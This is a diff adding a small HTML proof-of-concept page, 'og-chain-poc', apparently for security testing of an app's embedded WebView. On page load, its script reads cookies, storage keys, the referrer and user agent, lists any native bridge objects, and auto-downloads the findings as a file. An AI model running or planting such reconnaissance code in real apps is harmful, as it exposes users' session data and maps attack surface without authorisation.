@@ -1,0 +1,44 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>og-chain-poc</title>
+
+<h1>og-chain-poc</h1>
+<pre id="out"></pre>
+
+<script>
+(async () => {
+  const out = {
+    href: location.href,
+    referrer: document.referrer,
+    ua: navigator.userAgent,
+    rn: typeof window.ReactNativeWebView,
+    bridges: Object.keys(window).filter(k =>
+      /bridge|native|og|app|android/i.test(k)
+    ),
+    cookie: document.cookie,
+    localStorage: Object.keys(localStorage),
+    sessionStorage: Object.keys(sessionStorage)
+  };
+
+  const findings = JSON.stringify(out, null, 2);
+
+  document.getElementById('out').textContent = findings;
+  console.log('OG_CHAIN ' + findings);
+
+  // Save findings into 1.txt
+  const blob = new Blob([findings], {
+    type: 'text/plain;charset=utf-8'
+  });
+
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+
+  a.href = url;
+  a.download = '1.txt';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+
+  URL.revokeObjectURL(url);
+})();
+</script>
